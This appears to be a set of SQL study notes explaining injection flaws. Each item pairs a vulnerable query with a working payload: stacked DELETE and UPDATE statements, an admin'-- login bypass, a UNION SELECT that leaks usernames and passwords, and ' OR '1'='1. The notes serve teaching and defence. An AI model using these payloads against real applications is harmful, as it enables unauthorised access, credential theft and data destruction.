--For example, in a SELECT statement:
SELECT * FROM users WHERE age > 18;

CONDITIONAL CONTROL
SELECT * FROM products WHERE name = 'user_input'; -- A typical query might look like this:
SELECT * FROM products WHERE name = 'shoe';       -- If the user inputs shoe, the query becomes:

exploit:
-- shoe'; DELETE FROM products; --;                  
                                    
SELECT * FROM products WHERE name = 'shoe'; DELETE FROM products; --'; --The resulting query is:
--This injects a new command (DELETE FROM products) into the query, potentially deleting all products.


AUTHENTICATION QUERIES:
SELECT * FROM users WHERE username = 'user_input' AND password = 'password_input'; -- In a login system, the query might be

exploit
--admin' -- as username and leaving the password field empty, 

--The query becomes:
SELECT * FROM users WHERE username = 'admin' --' AND password = 'password_input'; 
--This bypasses the password check for the admin user.

Easy to Manipulate for Broad Impact:
UPDATE users SET email = 'new_email' WHERE username = 'user_input'; -- In a query for updating user details:

exploit
-- username'; UPDATE users SET email = 'malicious@email.com' WHERE 'x' = 'x

UPDATE users SET email = 'new_email' WHERE username = 'username'; UPDATE users SET email = 'malicious@email.com' WHERE 'x' = 'x';
/*
The resulting query updates the email for all users.
The purpose here is to ensure that the UPDATE command affects all rows in the users table. Without this condition, the UPDATE might not change any data or only change data limited by the original query's conditions.
*/

LACK OF PROPER SANITIZATION :
--In a query for selecting user details:
SELECT * FROM users WHERE city = 'user_input';

exploit:
--any_city' UNION SELECT username, password FROM users -- '
--This could leak usernames and passwords.


VERBOSE ERROR MESSAGE:
--If the application displays detailed errors, an attacker could use inputs like 

exploit
--' OR '1'='1 
--to determine the database structure or refine further attacks.

SELECT * FROM transactions WHERE user_id = 'user_input';

exploit
--' OR '1'='1
--This could reveal transactions of all users


